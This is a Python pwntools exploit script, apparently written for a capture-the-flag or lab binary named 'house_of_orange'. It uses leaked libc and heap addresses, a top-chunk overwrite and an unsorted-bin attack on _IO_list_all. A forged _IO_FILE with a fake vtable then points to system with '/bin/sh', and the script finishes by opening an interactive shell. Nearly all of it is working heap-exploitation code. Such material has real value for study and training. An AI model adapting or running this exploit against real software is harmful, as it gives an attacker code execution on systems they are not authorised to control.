from pwn import *

elf = context.binary = ELF("house_of_orange", checksec=True)
libc = elf.libc
#context.log_level = "debug"

gs = """continue"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

io = start()

io.recvuntil(b"puts() @ ")
puts_leak = int(io.recvline().rstrip(), 16)
log.info(f"puts leak @ {puts_leak:#x}")
libc.address = puts_leak - libc.sym.puts
log.info(f"libc base @ {libc.address:#x}")
io.recvuntil(b"heap @ ")
heap = int(io.recvline().rstrip(), 16)
log.info(f"heap beginning @ {heap:#x}")


# made for interacting with the programs menu
def interaction(small=False, large=False, edit_cmd=False):
    if edit_cmd != False:
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"data: ", edit_cmd)
    if small != False:
        io.sendlineafter(b"> ", b"1")
    if large != False:
        io.sendlineafter(b"> ", b"2")


def _forge_fake_vtable(padding:bytes, flags:bytes, size:int, fd:int, bk:int, write_base:int, write_ptr:int, mode:int, vtable_ptr:int, overflow:int) -> bytes:
    payload = flat( padding, flags, p64(size), p64(fd), p64(bk),  # unsortedbin attack: padding till we reach _flags member, then we write the new fd and bk.
                   p64(write_base), p64(write_ptr), b"\x00" * 0x90, p32(mode) + p32(0),  # fsop: write_base < write_ptr, padding, 4 byte member _mode fill rest of qword with nullbytes
                   p64(0), p64(overflow), p64(vtable_ptr) )  # 8 bytes of padding before we reach the overflow member and we write the address of the fake _IO_jump_t
    return payload


# overwrite top chunk and gain unsortedbin via triggering _int_free()
interaction(small=True)
topchunk = b"A"*24 + p64(0x1000 - 0x20 + 1)
interaction(edit_cmd=topchunk)
interaction(large=True)

# unsortedbin attack -> fsop
payload = _forge_fake_vtable(b"B"*0x10, flags=b"/bin/sh\0", size=0x61, fd=0, bk=(libc.sym._IO_list_all - 0x10),
                             write_base=0x539, write_ptr=0x1337, mode=0, vtable_ptr=heap+0xd8, overflow=libc.sym.system)
interaction(edit_cmd=payload)
log.info(f"unsortedbin: {heap:#x}")
interaction(small=True)
io.interactive()
